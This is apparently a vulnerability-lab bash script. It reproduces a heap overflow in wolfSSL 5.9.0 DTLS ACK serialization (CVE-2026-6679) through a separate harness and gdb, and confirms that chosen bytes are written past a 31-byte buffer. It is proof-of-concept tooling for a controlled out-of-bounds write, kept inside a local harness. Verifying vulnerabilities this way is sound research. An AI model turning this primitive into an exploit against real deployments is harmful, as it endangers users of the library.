#!/usr/bin/env bash
# OPTIONAL staged-heap readback for CVE-2026-6679.
#
# Builds a *separate, non-ASan* copy of the pinned v5.9.0 tree and runs the
# CHOSEN harness under gdb.  The harness deliberately keeps writing past the
# undersized output buffer so recognizable 16-byte records land in adjacent
# heap memory.  gdb reads them after the serialization call returns.
#
# This is STAGED HEAP in an in-process harness.  It is not a live DTLS peer,
# listener, application, pointer dereference, or control-flow hijack demo.
set -euo pipefail

LAB="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="${1:-$LAB/out}"
case "$OUT" in
    /*) ;;
    *) echo "outdir must be absolute: $OUT" >&2; exit 2 ;;
esac
mkdir -p "$OUT/logs"

TREE="$LAB/build/wolfssl-5.9.0-plain"
if [ ! -d "$TREE" ]; then
    separate="$LAB/build/plain-src"
    mkdir -p "$separate"
    tar xzf "$LAB/src/v5.9.0-stable.tar.gz" -C "$separate"
    mv "$separate/wolfssl-5.9.0-stable" "$TREE"
    rmdir "$separate"
fi
if [ ! -f "$TREE/src/.libs/libwolfssl.a" ]; then
    (
        cd "$TREE"
        if [ ! -x ./configure ]; then
            ./autogen.sh > "$OUT/logs/plain-autogen.log" 2>&1
        fi
        ./configure --enable-dtls --enable-tls13 --enable-dtls13 \
            --disable-shared --enable-static --disable-examples \
            --disable-crypttests CFLAGS='-g -O0 -fno-omit-frame-pointer' \
            > "$OUT/logs/plain-configure.log" 2>&1
        make -j2 > "$OUT/logs/plain-make.log" 2>&1
    )
fi

gcc -g -O0 -fno-omit-frame-pointer -Wno-deprecated-declarations \
    -I"$TREE" "$LAB/ack_overflow.c" "$TREE/src/.libs/libwolfssl.a" \
    -lm -lpthread -o "$OUT/ack_overflow_chosen_plain"

cat > "$OUT/gdb-readback.cmd" <<'EOF'
set pagination off
set confirm off
set print elements 0
break ack_overflow.c:179
run 4097 CHOSEN
printf "STAGED_HEAP output_buffer=%p buffer_size=%u\n", ssl->buffers.outputBuffer.buffer, ssl->buffers.outputBuffer.bufferSize
printf "RECORD_1 offset=31 (past undersized 31-byte buffer)\n"
x/16xb ssl->buffers.outputBuffer.buffer + 15 + 16
printf "RECORD_2 offset=47\n"
x/16xb ssl->buffers.outputBuffer.buffer + 15 + 32
printf "RECORD_3 offset=63\n"
x/16xb ssl->buffers.outputBuffer.buffer + 15 + 48
printf "RECORD_9 offset=159\n"
x/16xb ssl->buffers.outputBuffer.buffer + 15 + 144
continue
quit
EOF

(cd "$LAB" && gdb -q -batch -x "$OUT/gdb-readback.cmd" \
    "$OUT/ack_overflow_chosen_plain") > "$OUT/logs/chosen-gdb.log" 2>&1 || true

# Expected CHOSEN bytes: epoch C0 FF EE 11 22 33 44 55 (serialized first),
# then seq A5 5A 00 00 <index as 4 big-endian bytes>.  In this build
# msgSz=16, the output allocation is 31 bytes, and record 1 starts at
# offset 31, i.e. the first record entirely past the allocation.  Record k
# uses index k because the sorted list is head-ordered by insertion index.
rc=0
epoch_hits="$(grep -cF '0xc0	0xff	0xee	0x11	0x22	0x33	0x44	0x55' "$OUT/logs/chosen-gdb.log" || true)"
if [ "$epoch_hits" -ge 4 ]; then
    echo 'PASS chosen_epoch_pattern_at_overflow_offsets'
else
    echo 'FAIL chosen_epoch_pattern_at_overflow_offsets' >&2
    rc=1
fi
for idx in 01 02 03 09; do
    pattern="0xa5	0x5a	0x00	0x00	0x00	0x00	0x00	0x${idx}"
    if grep -qF "$pattern" "$OUT/logs/chosen-gdb.log"; then
        printf 'PASS chosen_record_%s_bytes_in_staged_heap\n' "$idx"
    else
        printf 'FAIL chosen_record_%s_bytes_in_staged_heap\n' "$idx" >&2
        rc=1
    fi
done
if grep -qF 'STAGED_HEAP output_buffer=' "$OUT/logs/chosen-gdb.log"; then
    echo 'PASS gdb_staged_heap_readback'
else
    echo 'FAIL gdb_staged_heap_readback' >&2
    rc=1
fi
exit "$rc"
